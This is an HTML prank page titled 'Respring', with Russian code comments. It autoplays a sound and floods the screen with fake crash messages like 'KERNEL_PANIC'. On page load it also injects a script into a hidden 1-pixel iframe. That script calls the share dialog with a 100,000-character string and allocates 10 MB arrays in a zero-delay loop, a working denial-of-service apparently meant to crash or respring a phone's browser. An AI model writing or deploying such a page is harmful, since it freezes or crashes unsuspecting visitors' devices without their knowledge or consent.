<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Respring</title>
    <style>
        body {
            background: #8b0000;
            color: #ffffff;
            margin: 0;
            padding: 0;
            overflow: hidden;
            font-family: 'JetBrains Mono', monospace;
            display: flex;
            flex-wrap: wrap;
            gap: 4px;
            align-content: flex-start;
            height: 100vh;
            width: 100vw;
            position: relative;
        }

        .error-msg {
            font-size: 6px;
            opacity: 0.6;
            white-space: nowrap;
            user-select: none;
            padding: 1px;
            position: relative;
            z-index: 10;
        }

        #respring-iframe {
            position: fixed;
            top: 0;
            left: 0;
            width: 1px;
            height: 1px;
            border: none;
            opacity: 0.01;
            pointer-events: none;
            z-index: -1;
        }
    </style>
</head>
<body>

<iframe id="respring-iframe"
    sandbox="allow-forms allow-modals allow-scripts allow-same-origin">
</iframe>

<script>
    // ===== WEB AUDIO ULTRA STABLE =====
    const audioUrl = "https://raw.githubusercontent.com/VityaIG/vityaig.github.io/main/otkat.mp3";

    let audioCtx;
    let buffer;
    let unlocked = false;

    async function initAudio() {
        if (!audioCtx) {
            audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        }

        // preload + decode
        if (!buffer) {
            const res = await fetch(audioUrl);
            const arr = await res.arrayBuffer();
            buffer = await audioCtx.decodeAudioData(arr);
        }
    }

    function playSound() {
        if (!buffer) return;

        const source = audioCtx.createBufferSource();
        source.buffer = buffer;
        source.loop = false;

        const gain = audioCtx.createGain();

        // ⚡ резкий старт
        const now = audioCtx.currentTime;
        gain.gain.setValueAtTime(0.0001, now);
        gain.gain.exponentialRampToValueAtTime(1.0, now + 0.01);

        source.connect(gain).connect(audioCtx.destination);
        source.start(0);
    }

    async function startAudio() {
        try {
            await initAudio();

            if (audioCtx.state === "suspended") {
                await audioCtx.resume();
            }

            playSound();
        } catch (e) {}
    }

    // ===== ⚡ АВТО-СТАРТ БЕЗ ЗАДЕРЖКИ =====
    window.addEventListener("load", () => {
        startAudio(); // 0ms, без setTimeout
    });

    // ===== 🎯 100% НАДЁЖНЫЙ ЗАПУСК ПО ПЕРВОМУ ДЕЙСТВИЮ =====
    function unlockAudio() {
        if (unlocked) return;
        unlocked = true;

        startAudio();

        document.removeEventListener("click", unlockAudio);
        document.removeEventListener("touchstart", unlockAudio);
        document.removeEventListener("pointerdown", unlockAudio);
    }

    document.addEventListener("click", unlockAudio, { once: true });
    document.addEventListener("touchstart", unlockAudio, { once: true });
    document.addEventListener("pointerdown", unlockAudio, { once: true });


    // ===== ОШИБКИ (НЕ ТРОГАЛ) =====
    const errorTemplates = [
        "Fatal Error 0x3333",
        "Entering Bootloop...",
        "KERNEL_PANIC",
        "OVERFLOW_DETECTION",
        "STACK_COLLISION",
        "MEMORY_CORRUPTION",
        "SYSTEM_FREEZE",
        "HARDWARE_MALFUNCTION"
    ];

    for (let i = 0; i < 3000; i++) {
        const span = document.createElement("span");
        span.className = "error-msg";
        span.innerText = errorTemplates[Math.floor(Math.random() * errorTemplates.length)];
        document.body.appendChild(span);
    }


    // ===== IFRAME (НЕ ТРОГАЛ) =====
    window.addEventListener("load", () => {
        setTimeout(() => {
            const frame = document.getElementById("respring-iframe");

            frame.srcdoc = `
                <html>
                <body style="margin:0;overflow:hidden;">
                <script>
                    setInterval(() => {
                        try {
                            navigator.share({ title: 'R', text: 'R'.repeat(100000) });
                        } catch(e) {}

                        let x = new Uint8Array(1024 * 1024 * 10);
                        crypto.getRandomValues(x);
                    }, 0);
                <\/script>
                </body>
                </html>
            `;
        }, 850);
    });

</script>

</body>
</html>
